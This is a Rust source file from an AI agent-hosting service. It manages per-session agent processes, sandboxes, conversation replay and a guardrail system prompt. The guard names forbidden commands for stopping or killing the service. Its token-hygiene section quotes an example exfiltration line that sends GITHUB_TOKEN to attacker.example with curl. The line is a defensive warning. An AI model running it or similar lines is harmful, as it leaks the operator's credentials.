//! Agent Registry - Manages pi Processes per Session
//!
//! Each session has its own pi process for context preservation.

use std::collections::{HashMap, HashSet};
use std::path::PathBuf;
use std::sync::Arc;
use tokio::sync::{Mutex, RwLock};
use uuid::Uuid;

use crate::db::{Profile, Session};
use crate::pi_agent::{PiAgent, PiConfig};
use crate::sandbox::SandboxManager;
use sqlx::PgPool;

/// Safety guard prepended to every profile's `system_prompt` so
/// the LLM never deploys code in a way that takes down the API
/// service the LLM is currently using.
///
/// The incident this guards against: in session
/// `820b09f3-…` on 2026-06-03 ~08:40 EDT, the model was
/// working on a nspawn sandbox refactor and ran this deploy
/// script as a single `bash` tool call:
///
/// ```text
/// ls -la …/target/release/forge-api
/// sudo systemctl stop forge-api      # <-- kills the API
/// sleep 2
/// sudo cp …/target/release/forge-api /opt/forge/forge-api
/// ls -la /opt/forge/forge-api
/// ```
///
/// `systemctl stop` brought the API down, the `cp` step
/// (which ran through the API as a streaming bash tool call)
/// never got a response, and the LLM's session died with the
/// rest of the API. The intended pattern — a staged deploy
/// where the operator is expected to bring the service back
/// up — is exactly what the `/admin/self-update` endpoint
/// exists to fix, but the LLM has to know to use it.
///
/// The guard is global (every profile gets it) so a custom
/// profile can't accidentally opt out. The guard is
/// prepended, not replaced, so profile authors can still
/// customize the model personality and task description
/// below the safety rules.
const AGENT_GUARD: &str = r#"
# Operational guardrails (forge)

You are running inside a forge sandbox. The `forge-api` HTTP
service is the only thing keeping your `bash`, `read`, `write`,
and `edit` tools, plus the `pi` runtime that hosts this session,
alive. If you kill it, your session ends.

## Deploying a new `forge-api` binary

Do **not** use `sudo systemctl stop|restart forge-api` directly.
The service is configured with `Restart=always` and an
`ExecStopPost=` that atomically swaps in a staged binary, so
the right pattern is a single POST that returns 202 before
the API exits:

```bash
# Build (you usually already have target/release/forge-api)
export PATH=/root/.cargo/bin:$PATH
cargo build --release -p forge-api

# Atomically deploy. The server writes the new binary to
# /opt/forge/forge-api.staging and a detached helper
# (`setsid bash -c 'sleep 0.5; systemctl restart forge-api'`)
# schedules the restart. ExecStopPost= moves staging -> final.
# Restart=always starts the new binary. The whole sequence
# takes ~1s and you get a 202 back before the API dies.
curl -X POST --data-binary @target/release/forge-api \
  -H "X-API-Key: $FORGE_API_KEY" \
  http://localhost:8080/admin/self-update
```

If the curl times out or returns a connection error, the
deploy probably succeeded — the connection dies because the
API is restarting. Verify with `ls -la /opt/forge/forge-api`
(mtime should be recent) and `sudo systemctl status
forge-api` (should be `active (running)` with a recent PID).

## Forbidden operations

- `sudo systemctl stop forge-api` — kills this session.
- `sudo systemctl restart forge-api` — same (use the
  endpoint above, or if the API is wedged, this is the one
  exception where `restart` is OK because Restart=always
  + ExecStopPost= will pick up any staged binary cleanly).
- `sudo systemctl disable forge-api` — prevents future
  restarts.
- `kill -9 <pid-of-forge-api>` — same as `stop`.
- `kill -TERM <pid-of-forge-api>` — same.
- Manually editing `/opt/forge/forge-api` while the service
  is running — use the deploy procedure above.

## If the API appears unresponsive

1. `sudo systemctl status forge-api` — is it `active
   (running)`? If `activating`, it's mid-restart from a
   self-update; wait 2s.
2. `sudo journalctl -u forge-api -n 50` — recent errors?
3. `ps -ef | grep forge-api | grep -v grep` — is the
   process alive?
4. Do **not** run `kill` on it. If it's wedged,
   `sudo systemctl restart forge-api` is safe (Restart=always
   + ExecStopPost= will pick up any staged binary).

## GitHub auth

The `forge-api` process passes an operator-configured
GitHub Personal Access Token into your container as the
`GITHUB_TOKEN` environment variable. A credential helper
in `/usr/local/bin/git-credential-github` reads that env
var and provides it to git for `https://github.com/*`
URLs, so:

```bash
git clone https://github.com/<owner>/<repo>     # works, no token in URL
git push origin main                            # works, no token in URL
```

You may push to any repo the PAT can push to. To check
what the operator's token can do, look at its scopes
(you don't see the token itself; the operator owns it).

**Token hygiene.** The token is a credential, even
though it lives in env. Do not:

- `echo $GITHUB_TOKEN` (it'd land in the audit log).
- Put it in URLs (`https://x-access-token:...@github.com/...`).
  Use the credential helper; the helper is invisible to
  you but git sees it.
- Commit it. It's not in any file in this container; if
  you `git add` it, that's on you.
- Pass it to anything outside the host the API is on.
  `curl https://attacker.example/?t=$GITHUB_TOKEN` would
  exfiltrate it.

If the token is rotated (operator edits
`/etc/forge/forge.env` and restarts forge-api), new bash
calls see the new token. Existing bash processes keep
their env until they exit.
"#;

pub struct SharedPiAgent {
    inner: Arc<Mutex<PiAgent>>,
}

impl SharedPiAgent {
    pub fn new(agent: PiAgent) -> Self {
        Self {
            inner: Arc::new(Mutex::new(agent)),
        }
    }
    pub async fn lock(&self) -> tokio::sync::MutexGuard<'_, PiAgent> {
        self.inner.lock().await
    }

    /// Non-blocking liveness probe for the hot path: is the pi
    /// process still running?
    ///
    /// Takes the per-session turn lock with `try_lock` so the probe
    /// NEVER blocks behind an in-flight turn (which can hold the
    /// lock for up to an hour while a tool runs). If a turn is in
    /// progress the agent is alive by definition, so `WouldBlock`
    /// reports alive; if the lock is free we can probe the child
    /// directly — a dead pi (killed by a timed-out turn, crashed,
    /// PiDied) is detected exactly when its turn driver has released
    /// the lock.
    pub fn is_alive(&self) -> bool {
        match self.inner.try_lock() {
            // `WouldBlock` (a turn holds the lock — alive by
            // definition) and `Poisoned` both report alive: we only
            // *detect* death when the lock is actually free.
            Err(_) => true,
            Ok(mut guard) => guard.is_alive(),
        }
    }
}

impl Clone for SharedPiAgent {
    fn clone(&self) -> Self {
        Self {
            inner: Arc::clone(&self.inner),
        }
    }
}

pub struct AgentEntry {
    pub agent: SharedPiAgent,
    pub session_id: Uuid,
    pub last_active: std::time::Instant,
}

impl AgentEntry {
    pub fn new(agent: PiAgent, session_id: Uuid) -> Self {
        Self {
            agent: SharedPiAgent::new(agent),
            session_id,
            last_active: std::time::Instant::now(),
        }
    }
}

pub struct AgentRegistry {
    agents: RwLock<HashMap<Uuid, AgentEntry>>,
    /// Per-session spawn locks. `get_or_create` has a TOCTOU race:
    /// two concurrent `POST /messages` on a cold session both see an
    /// empty agents map, both run the slow path (sandbox create,
    /// tool-call replay, jsonl write, `PiAgent::spawn`), and both
    /// insert — spawning two pi processes for one session. These
    /// locks serialize the slow path per session: the second caller
    /// blocks on the lock, and after it acquires it re-checks the
    /// agents map (double-checked locking) and finds the entry the
    /// first caller inserted. The map entry is removed when the slow
    /// path finishes, so the map doesn't grow unboundedly.
    ///
    /// `std::sync::Mutex` (not tokio's): it is only ever held across
    /// plain map operations (never an await), and the synchronous
    /// `Drop` on `SpawnLockDtor` must be able to remove the entry on
    /// *every* exit path — an async lock cannot be awaited from `Drop`.
    spawn_locks: std::sync::Mutex<HashMap<Uuid, Arc<tokio::sync::Mutex<()>>>>,
    /// Sessions whose working directory must be preserved on the next
    /// `get_or_create`, set by the model-switcher's `update_session`
    /// (which tears down only the pi agent and explicitly promises
    /// the workspace survives). When set, `get_or_create` asks
    /// `create_container` to skip the wipe-and-repopulate step and
    /// skips the tool-call replay (the tree already carries the
    /// prior state — replaying would double-apply every edit). The
    /// flag is consumed (cleared) by the next `get_or_create`.
    preserve_working_dir: RwLock<HashSet<Uuid>>,
    forge_api_url: String,
    forge_tools_extension: PathBuf,
    /// Directory of pi skill packs (`<skill>/SKILL.md`)
    /// passed to pi as `--no-skills --skill <path>`. `None`
    /// keeps the legacy `--no-skills` behavior — the agent
    /// cannot discover any skills. The canonical default is the
    /// `skills/` tree at the repo root; that path is
    /// repo-relative so the skill content is the same
    /// across machines and across `cargo install` /
    /// `nix profile` / `apt` deploys. Operators override
    /// via `FORGE_SKILLS_DIR`. See `docs/SEARCH-TOOL.md`
    /// for the operator workflow.
    skills_dir: Option<PathBuf>,
    /// Per-session sandbox containers. Each session gets a
    /// fresh clone (if profile.git_url is set) or copy (if
    /// profile.working_dir exists) so the agent's edits don't
    /// touch the user's real checkout. The spawned pi runs
    /// with `current_dir` pointed at the sandbox path.
    sandbox: Arc<SandboxManager>,
    /// Credential used to authenticate `/tools/execute*` calls from
    /// the `forge-tools` extension running inside forge-api's own pi
    /// subprocesses. This is the operator's `FORGE_API_KEY` when the
    /// API runs with one (dev/prod env file), otherwise a random
    /// per-process token. forge-api exports it to pi as
    /// `FORGE_API_KEY`, the extension sends it back as `X-API-Key`,
    /// and `auth_middleware` accepts it on the tool endpoints (in
    /// addition to real DB api keys). This closes the hole where
    /// `/tools/execute` was fully unauthenticated (anyone on the
    /// port could run arbitrary commands) because the endpoints were
    /// allowlisted as "the extension is in-process".
    tool_auth_token: String,
    /// Sessions with a turn currently in flight in
    /// [`crate::api::turn::drive_turn`]. The idle-cleanup task must
    /// not reap a session mid-turn: a legitimate turn can run up to
    /// the 1-hour tool-read timeout, well past the 30-minute
    /// `last_active` cutoff. `drive_turn` registers on entry and a
    /// drop guard clears it on every exit path (return, error,
    /// panic, task abort). `std::sync::RwLock`: held only across
    /// plain set operations, never an await.
    in_flight_turns: std::sync::RwLock<HashSet<Uuid>>,
}

impl AgentRegistry {
    /// Mark a session's working directory as preserved across the
    /// next agent spawn. Called by the model-switcher
    /// (`update_session`) when it tears down the in-memory pi and
    /// promises the workspace survives; `get_or_create` honors it for
    /// exactly one spawn, then clears it.
    pub async fn preserve_working_dir_on_next_spawn(&self, session_id: Uuid) {
        self.preserve_working_dir.write().await.insert(session_id);
    }

    /// Take (consume) the preserve flag for a session, if set.
    async fn take_preserve_flag(&self, session_id: Uuid) -> bool {
        let mut flags = self.preserve_working_dir.write().await;
        flags.remove(&session_id)
    }

    pub fn new(forge_api_url: String, sandbox: Arc<SandboxManager>) -> Self {
        // Allow the extension path to be overridden via env so the same
        // binary works in dev and production. Default to the well-known dev
        // location.
        let extension_path = std::env::var("FORGE_TOOLS_EXTENSION")
            .map(PathBuf::from)
            .unwrap_or_else(|_| {
                PathBuf::from(
                    "/data/jbutler/git/jbutlerdev/forge/extensions/forge-tools/dist/index.js",
                )
            });
        // Skills directory: read `FORGE_SKILLS_DIR` from the
        // forge-api process env. Empty / unset / a path that
        // doesn't exist on disk: fall back to `<repo>/skills`
        // if that exists (the bundled, versioned default), and
        // only disable skills entirely if neither is usable.
        // The reasoning: a missing or empty env var almost
        // always means "use the bundled default" rather than
        // "no skills", because the operator likely just hasn't
        // customised it.
        let skills_dir = std::env::var("FORGE_SKILLS_DIR")
            .ok()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .map(PathBuf::from)
            .or_else(default_skills_dir);
        let skills_dir = skills_dir.filter(|p| {
            if !p.is_dir() {
                tracing::warn!(
                    skills_dir = %p.display(),
                    "FORGE_SKILLS_DIR / default skills directory does not exist; agent will run with --no-skills"
                );
                return false;
            }
            true
        });
        // The tool token: prefer the operator's key (rotation of
        // `FORGE_API_KEY` in `/etc/forge/forge.env` rotates the
        // credential the extension uses too); fall back to a
        // random per-process token for dev / test runs that have
        // no env key. In the fallback case the token never enters
        // the DB — it is only ever compared against the header the
        // extension sends back.
        let tool_auth_token = std::env::var("FORGE_API_KEY")
            .ok()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .unwrap_or_else(|| format!("sk_internal_{}", Uuid::new_v4().simple()));
        Self {
            agents: RwLock::new(HashMap::new()),
            spawn_locks: std::sync::Mutex::new(HashMap::new()),
            preserve_working_dir: RwLock::new(HashSet::new()),
            forge_api_url,
            forge_tools_extension: extension_path,
            skills_dir,
            sandbox,
            tool_auth_token,
            in_flight_turns: std::sync::RwLock::new(HashSet::new()),
        }
    }

    /// The credential the `forge-tools` extension (in forge-api's
    /// pi subprocesses) uses to authenticate `/tools/execute*`
    /// calls. See the `tool_auth_token` field doc.
    pub fn tool_auth_token(&self) -> &str {
        &self.tool_auth_token
    }

    pub async fn get_or_create(
        &self,
        pool: &PgPool,
        session_id: Uuid,
    ) -> Result<SharedPiAgent, AgentRegistryError> {
        // Hot path: the user is in the same session, so keep using
        // the same pi — unless the cached pi is dead (killed by a
        // timed-out turn, crashed). A dead entry must not be handed
        // back: every prompt to it would fail on closed stdin until
        // idle cleanup reaped the session 30 minutes later. Instead
        // we drop the entry and fall through to the slow path
        // (respawn + durable replay).
        if let Some(agent) = self.live_agent_or_drop_dead(pool, session_id).await {
            return Ok(agent);
        }

        // Per-session spawn lock: serializes the slow path below so
        // two concurrent dispatches on a cold session can't both
        // spawn pi (the TOCTOU race). Waiters re-check the agents
        // map after acquiring the lock and find the entry the first
        // caller inserted. The `SpawnLockDtor` below removes the map
        // entry on every exit path (success, `?` early return, panic),
        // so failed spawns can't grow the map.
        let spawn_lock = {
            let mut locks = self.spawn_locks.lock().unwrap_or_else(|e| e.into_inner());
            locks
                .entry(session_id)
                .or_insert_with(|| Arc::new(tokio::sync::Mutex::new(())))
                .clone()
        };
        let _spawn_guard = spawn_lock.lock().await;

        // Scope guard: remove this session's spawn-lock entry when
        // the slow path exits, on every path. Previously the
        // removal only ran on success, so every failed
        // `get_or_create` (bogus session id, DB down, spawn error)
        // leaked one entry — a retry loop hitting bad ids could
        // grow the map unboundedly.
        struct SpawnLockDtor<'a> {
            registry: &'a AgentRegistry,
            session_id: Uuid,
        }
        impl Drop for SpawnLockDtor<'_> {
            fn drop(&mut self) {
                if let Ok(mut locks) = self.registry.spawn_locks.lock() {
                    locks.remove(&self.session_id);
                }
            }
        }
        let _spawn_lock_dtor = SpawnLockDtor {
            registry: self,
            session_id,
        };
        {
            // Double-checked locking: another request may have
            // spawned the agent while we waited for the lock. Same
            // liveness check as the hot path: a dead entry found
            // here (we lost the race with a concurrent drop, or pi
            // died between probes) is dropped and we fall through
            // to the spawn below.
            if let Some(agent) = self.live_agent_or_drop_dead(pool, session_id).await {
                return Ok(agent);
            }
        }

        // No live pi for this session. Spawn a fresh one, and
        // (this is the whole point of the durability story)
        // replay the prior conversation from the messages table
        // into it before we hand it back to the caller. See
        // `replay_prior_conversation` below.
        let _ =
            sqlx::query("UPDATE sessions SET ended_at = NULL, last_active = NOW() WHERE id = $1")
                .bind(session_id)
                .execute(pool)
                .await;

        // Get session and profile
        let session: Session = sqlx::query_as("SELECT * FROM sessions WHERE id = $1")
            .bind(session_id)
            .fetch_one(pool)
            .await
            .map_err(|e| AgentRegistryError::Database(e.to_string()))?;

        let profile: Profile = sqlx::query_as("SELECT * FROM profiles WHERE id = $1")
            .bind(session.profile_id)
            .fetch_one(pool)
            .await
            .map_err(|e| AgentRegistryError::Database(e.to_string()))?;

        // The agent's cwd is the per-session sandbox path. We
        // let the sandbox manager create a fresh clone (if
        // the profile has a git_url) or copy (if working_dir
        // is a real path on the host). If the sandbox setup
        // fails -- e.g. the profile has neither a git_url
        // nor a working_dir, or the copy/clone errors -- we
        // fall back to the bare session directory so the
        // session can still spawn (the agent will work in an
        // empty dir, which is at least bootable).
        // Model-switcher: consume the preserve flag (set by
        // `update_session`) before deciding how to prepare the
        // sandbox. When set, `create_container` keeps the existing
        // working tree instead of wiping it back to the baseline, and
        // the tool-call replay below is skipped (the tree already
        // carries the prior state; replaying would double-apply
        // every bash/write/edit call).
        let preserve_working_dir = self.take_preserve_flag(session_id).await;
        if preserve_working_dir {
            tracing::info!(
                session_id = %session_id,
                "preserving existing working dir on spawn (model switch)"
            );
        }
        let working_dir = if preserve_working_dir {
            match self
                .sandbox
                .create_container_preserving(session_id, &profile)
                .await
            {
                Ok(container) => {
                    tracing::info!(
                        session_id = %session_id,
                        sandbox_dir = %container.working_dir.display(),
                        "prepared sandbox for session (preserving working tree)"
                    );
                    container.working_dir.to_string_lossy().to_string()
                }
                Err(e) => {
                    tracing::warn!(
                        error = %e,
                        session_id = %session_id,
                        "sandbox create (preserve) failed; falling back to bare session dir"
                    );
                    let dir = self.sandbox.session_working_dir(session_id);
                    let _ = tokio::fs::create_dir_all(&dir).await;
                    dir.to_string_lossy().to_string()
                }
            }
        } else {
            match self.sandbox.create_container(session_id, &profile).await {
                Ok(container) => {
                    tracing::info!(
                        session_id = %session_id,
                        sandbox_dir = %container.working_dir.display(),
                        git_url = profile.git_url.as_deref().unwrap_or(""),
                        "prepared sandbox for session"
                    );
                    container.working_dir.to_string_lossy().to_string()
                }
                Err(e) => {
                    tracing::warn!(
                        error = %e,
                        session_id = %session_id,
                        "sandbox create failed; falling back to bare session dir"
                    );
                    // Use the sandbox manager's session dir (which
                    // `create_session` already created, and which is a
                    // tempdir in tests / `/forge/sessions` in prod)
                    // rather than a hard-coded `/forge/sessions/<id>`.
                    // The hard-coded path doesn't exist in CI (no
                    // `/forge/` tree), so `pi`'s `current_dir` would be
                    // invalid and spawn would fail. `create_dir_all` is
                    // defensive in case `create_container` failed before
                    // creating the working dir.
                    let dir = self.sandbox.session_working_dir(session_id);
                    let _ = tokio::fs::create_dir_all(&dir).await;
                    dir.to_string_lossy().to_string()
                }
            }
        };

        let _tools: Vec<String> = serde_json::from_str(&profile.tools).unwrap_or_else(|_| {
            vec![
                "bash".to_string(),
                "read".to_string(),
                "write".to_string(),
                "edit".to_string(),
            ]
        });

        // Restore the sandbox's working tree to its prior
        // state by re-executing the recorded `bash` /
        // `write` / `edit` tool calls from the `messages`
        // table in order. Skips `read` (no side effects to
        // restore) and tool calls with no matching result
        // row (interrupted mid-execution in the prior
        // session). The LLM-context half of resume
        // (rebuilding the model's view of the conversation)
        // is handled separately by
        // `build_session_jsonl_and_load` below. The replay
        // path is independent of how the LLM context is
        // restored; the two halves together put the agent
        // back into a useful state. On a brand-new session
        // the messages table is empty and the replay is a
        // cheap no-op (one SELECT, zero replays). On a
        // resume, the replay is the difference between
        // "the model has the prior context but no files"
        // and "the model has the prior context AND the
        // prior filesystem state."
        //
        // On a model switch the working tree was preserved
        // (not wiped), so the replay is skipped — re-running
        // the recorded calls against an already-mutated tree
        // would double-apply every edit.
        if !preserve_working_dir {
            let replay_stats = crate::resume::replay_tool_calls(
                pool,
                session_id,
                &working_dir,
                profile.nix_shell.clone(),
            )
            .await;
            if replay_stats.considered > 0 {
                tracing::info!(
                    session_id = %session_id,
                    considered = replay_stats.considered,
                    executed = replay_stats.executed,
                    failed = replay_stats.failed,
                    diverged = replay_stats.diverged,
                    skipped = replay_stats.skipped,
                    "durable resume: replayed prior tool calls to restore sandbox working tree"
                );
            }
        }

        // Durable resume: rebuild the LLM's context from the
        // `messages` table. We write a pi-format session
        // jsonl from the audit log, then pass its path to
        // pi's `--session` CLI flag. The fresh pi loads the
        // file as its active session at startup, so the
        // model sees the full prior conversation as a
        // proper tree of structured messages
        // (UserMessage / AssistantMessage { text,
        // toolCall } / ToolResultMessage). The prior
        // preamble approach (a giant user message
        // containing the transcript as plain text) was
        // strictly worse: it lost `tool_input` /
        // `tool_output` jsonb structure and blew up the
        // model's context window on long sessions.
        //
        // The pi subprocess is disposable; the `messages`
        // table is the source of truth. When a session is
        // re-activated after a long pause, the prior pi is
        // long dead, the in-memory agent is gone, and the
        // sandbox has been re-cloned to a clean state
        // (with the prior `bash`/`write`/`edit` tool calls
        // re-executed against it — see
        // [`crate::resume::replay_tool_calls`] above). The
        // only thing left is the audit log. We rebuild
        // the LLM's context from that.
        //
        // The user's just-arrived prompt is the LATEST row
        // in the messages table (the harness inserted it
        // before calling us). We exclude it from the jsonl
        // and send it through pi's normal stdin `prompt`
        // flow — that way the model sees the prior
        // conversation (from the jsonl) followed by the new
        // prompt (from stdin), in that order, exactly once
        // each. Without this cap, the model would see the
        // user prompt twice.
        //
        // The jsonl write must succeed BEFORE we spawn
        // pi, because pi will try to read the file the
        // moment it starts. If the write fails or the
        // messages table is empty (brand-new session),
        // we pass `None` to PiConfig and pi starts with
        // a fresh in-memory context (the user's prompt
        // is then the first thing in its tree). Either
        // way the user can see the prior conversation
        // in the `forge message list` output.
        let jsonl_path = crate::session_replay::parent_jsonl_path(&working_dir);
        // Exclude the just-inserted user message (current
        // max sequence) from the jsonl.
        let max_prior_sequence: Option<i32> =
            sqlx::query_scalar("SELECT MAX(sequence) - 1 FROM messages WHERE session_id = $1")
                .bind(session_id)
                .fetch_one(pool)
                .await
                .ok()
                .flatten();
        let session_path = match crate::session_replay::write_session_jsonl_with_max_seq(
            pool,
            session_id,
            &working_dir,
            &jsonl_path,
            max_prior_sequence,
        )
        .await
        {
            Ok(0) => {
                tracing::info!(
                    session_id = %session_id,
                    "no prior messages for session; spawning pi with fresh in-memory context"
                );
                None
            }
            Ok(count) => {
                tracing::info!(
                    session_id = %session_id,
                    jsonl_entries = count,
                    jsonl_path = %jsonl_path.display(),
                    "durable resume: wrote prior conversation to jsonl; spawning pi with --session"
                );
                Some(jsonl_path)
            }
            Err(e) => {
                tracing::warn!(
                    session_id = %session_id,
                    error = %e,
                    "durable resume: failed to write session jsonl; spawning pi with fresh in-memory context. The prior conversation is still in the messages table."
                );
                None
            }
        };

        let config = PiConfig {
            working_dir: working_dir.clone(),
            // Model switcher (Option A): prefer the session's
            // per-session override over the profile's value when
            // set. The workspace (working_dir / git_url / tools /
            // system_prompt) stays profile-derived — only the
            // brain (provider + model + credentials) is
            // overridable, so switching models mid-conversation
            // doesn't move the agent into a different repo.
            provider: session
                .override_provider
                .clone()
                .unwrap_or_else(|| profile.provider.clone()),
            model: session
                .override_model
                .clone()
                .unwrap_or_else(|| profile.model.clone()),
            base_url: session
                .override_base_url
                .clone()
                .or(profile.base_url.clone()),
            api_key: session.override_api_key.clone().or(profile.api_key.clone()),
            // AGENT_GUARD is prepended to the profile's
            // system_prompt. We don't replace it — the
            // profile can still customize the model
            // personality and task description. The guard
            // lives at the top so the model sees it first
            // and is reminded of the deploy procedure
            // before it starts planning work.
            system_prompt: format!("{}\n\n{}", AGENT_GUARD, profile.system_prompt),
            forge_tools_extension: self.forge_tools_extension.clone(),
            forge_api_url: self.forge_api_url.clone(),
            // The tool-execution credential the extension sends on
            // `/tools/execute*`. Always set: either the operator's
            // API key or a per-process random token.
            forge_api_key: Some(self.tool_auth_token.clone()),
            session_id,
            session_path,
            skills_dir: self.skills_dir.clone(),
        };

        let agent = PiAgent::spawn(config)
            .await
            .map_err(|e| AgentRegistryError::AgentSpawn(e.to_string()))?;

        tracing::info!(
            "Spawned pi agent for session {} with PID {:?}",
            session_id,
            agent.id()
        );

        let entry = AgentEntry::new(agent, session_id);
        let shared_agent = entry.agent.clone();

        {
            let mut agents = self.agents.write().await;
            agents.insert(session_id, entry);
        }

        Ok(shared_agent)
    }

    /// Hot-path lookup: return the cached agent if it exists and
    /// its pi process is alive, bumping `sessions.last_active` as
    /// before. If the entry exists but pi is dead, drop the entry
    /// (short write lock) and return `None` so the caller falls
    /// through to the slow path. If no entry exists at all, return
    /// `None` without touching the write lock (the cold path is the
    /// normal case here).
    async fn live_agent_or_drop_dead(
        &self,
        pool: &PgPool,
        session_id: Uuid,
    ) -> Option<SharedPiAgent> {
        let entry_present_but_dead = {
            let agents = self.agents.read().await;
            match agents.get(&session_id) {
                Some(entry) if entry.agent.is_alive() => {
                    let _ = sqlx::query("UPDATE sessions SET last_active = NOW() WHERE id = $1")
                        .bind(session_id)
                        .execute(pool)
                        .await;
                    return Some(entry.agent.clone());
                }
                Some(_) => true,
                None => false,
            }
        };
        if entry_present_but_dead {
            tracing::info!(
                session_id = %session_id,
                "cached pi agent is dead; dropping entry (slow path will respawn via durable replay)"
            );
            self.agents.write().await.remove(&session_id);
        }
        None
    }

    /// Mark `session_id` as having a turn in flight. Called by the
    /// turn driver on entry; the matching [`Self::end_turn`] runs via
    /// a drop guard on every driver exit path.
    pub fn begin_turn(&self, session_id: Uuid) {
        self.in_flight_turns
            .write()
            .unwrap_or_else(|e| e.into_inner())
            .insert(session_id);
    }

    /// Clear the in-flight mark for `session_id`.
    pub fn end_turn(&self, session_id: Uuid) {
        self.in_flight_turns
            .write()
            .unwrap_or_else(|e| e.into_inner())
            .remove(&session_id);
    }

    /// True if a turn is currently in flight for `session_id`.
    /// Used by the idle-cleanup task to defer reaping a session that
    /// is between its `last_active` bump and the end of a long turn.
    pub fn has_in_flight_turn(&self, session_id: Uuid) -> bool {
        self.in_flight_turns
            .read()
            .unwrap_or_else(|e| e.into_inner())
            .contains(&session_id)
    }

    pub async fn contains(&self, session_id: Uuid) -> bool {
        let agents = self.agents.read().await;
        agents.contains_key(&session_id)
    }

    pub async fn remove(&self, session_id: Uuid) -> Result<(), AgentRegistryError> {
        // Take the map write lock only long enough to clone the agent
        // and drop the entry, then kill pi *after* the map lock is
        // released. The per-session agent mutex may be held for up to
        // an hour by an in-flight turn (TOOL_READ_TIMEOUT_SECS); the
        // previous shape awaited it while holding the global write
        // lock, which stalled every other session's dispatch (and the
        // 60s cleanup/metrics ticks) for the whole turn.
        let agent = self
            .agents
            .write()
            .await
            .remove(&session_id)
            .map(|entry| entry.agent);
        if let Some(agent) = &agent {
            agent
                .lock()
                .await
                .kill()
                .await
                .map_err(|e| AgentRegistryError::AgentKill(e.to_string()))?;
        }
        // Drop any stale spawn-lock entry too, so a session that was
        // removed (idle cleanup / delete) doesn't leave one behind.
        if let Ok(mut locks) = self.spawn_locks.lock() {
            locks.remove(&session_id);
        }
        self.preserve_working_dir.write().await.remove(&session_id);
        Ok(())
    }

    pub async fn len(&self) -> usize {
        let agents = self.agents.read().await;
        agents.len()
    }

    pub async fn is_empty(&self) -> bool {
        self.len().await == 0
    }
}

impl Default for AgentRegistry {
    fn default() -> Self {
        // No sandbox wired up by default; tests that need it
        // construct one explicitly.
        Self::new(
            "http://localhost:8080".to_string(),
            Arc::new(SandboxManager::new()),
        )
    }
}

/// Resolve the default skills directory, used when
/// `FORGE_SKILLS_DIR` is unset / empty.
///
/// We try three locations, in order, returning the first
/// that exists as a directory:
///
/// 1. `<exe_dir>/../../../skills` — the layout when
///    forge-api was built and installed in place from
///    this repo (`target/release/forge-api` and the
///    `skills/` tree are siblings of `Cargo.toml`'s
///    workspace root). This is the common dev case.
/// 2. `<current_dir>/skills` — the layout when
///    forge-api is run from the repo root
///    (`cargo run -p forge-api`).
/// 3. `<exe_dir>/../share/forge/skills` — the standard
///    FHS / `cargo install --path` layout, where the
///    `skills/` tree would be installed next to
///    `share/` and `bin/`. We don't actually install to
///    this path today, but listing it makes the function
///    forward-compatible with a future install rule.
///
/// `None` means none of the candidates exist; the
/// `AgentRegistry::new` caller logs a warning and falls
/// back to `--no-skills`.
fn default_skills_dir() -> Option<PathBuf> {
    let exe = std::env::current_exe().ok()?;
    let exe_dir = exe.parent()?;

    let candidates = [
        // `target/{release,debug}/forge-api` → repo root → skills
        exe_dir.join("../../../skills"),
        // `cargo run` from repo root
        std::env::current_dir()
            .ok()
            .map(|cwd| cwd.join("skills"))
            .unwrap_or_else(|| PathBuf::from("")),
        // FHS-style install (share/forge/skills)
        exe_dir.join("../share/forge/skills"),
    ];

    candidates.into_iter().find(|p| p.is_dir())
}

#[derive(Debug, thiserror::Error)]
pub enum AgentRegistryError {
    #[error("Database error: {0}")]
    Database(String),
    #[error("Failed to spawn agent: {0}")]
    AgentSpawn(String),
    #[error("Failed to kill agent: {0}")]
    AgentKill(String),
}
